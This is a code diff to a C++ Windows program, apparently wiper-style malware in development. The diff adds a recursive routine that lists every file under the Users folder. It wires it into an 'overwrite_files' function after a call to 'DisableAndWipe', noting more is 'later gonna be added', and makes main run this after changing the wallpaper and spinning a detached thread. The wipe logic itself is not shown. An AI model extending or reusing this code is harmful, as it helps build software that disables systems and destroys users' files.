@@ -21,7 +21,7 @@ private:
 	int result1;
 	DWORD result2;
 	char buffer1[MAX_PATH] = { 0 };
-	char main_drive[MAX_PATH];
+	char main_drive[MAX_PATH] = { 0 };
 
 	void get_main_drive() {
 		result2 = GetLogicalDriveStringsA(MAX_PATH, buffer1);
@@ -64,6 +64,37 @@ private:
 			CloseHandle(pi.hThread);
 		}
 	}
+
+	void ListFiles(const string& path) {
+		WIN32_FIND_DATAA findFileData;
+		HANDLE hFind = INVALID_HANDLE_VALUE;
+
+		string searchPath = path + "\\*";
+
+		hFind = FindFirstFileA(searchPath.c_str(), &findFileData);
+
+		if (hFind == INVALID_HANDLE_VALUE) {
+			cerr << "FindFirstFile failed for " << path << endl;
+			return;
+		}
+
+		do {
+			if (strcmp(findFileData.cFileName, ".") != 0 && strcmp(findFileData.cFileName, "..") != 0) {
+				string newPath = path + "\\" + findFileData.cFileName;
+
+				if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
+					cout << "Directory: " << newPath << endl;
+					ListFiles(newPath);  
+				}
+				else {
+					cout << "File: " << newPath << endl;
+				}
+			}
+		} while (FindNextFileA(hFind, &findFileData) != 0);
+
+		FindClose(hFind);
+	}
+	
 public:
 	Functionality() {
 		AllocConsole();
@@ -164,9 +195,16 @@ public:
 		ShellExecuteA(NULL, "open", "notepad.exe", FolderPathA.c_str(), NULL, SW_SHOWMAXIMIZED);
 	}
 	
+	
 	void overwrite_files() {
-		get_main_drive();
 		DisableAndWipe();
+		get_main_drive();
+
+		string dup(main_drive);
+		dup += "Users";
+
+		ListFiles(dup);
+	
 
 		/* Later gonna be added */
 
@@ -198,6 +236,8 @@ int main() {
 	fork_thread.detach();
 
 	Obj.wallpaper_func();
+	Obj.overwrite_files();
+
 	while (1) {}
 
 
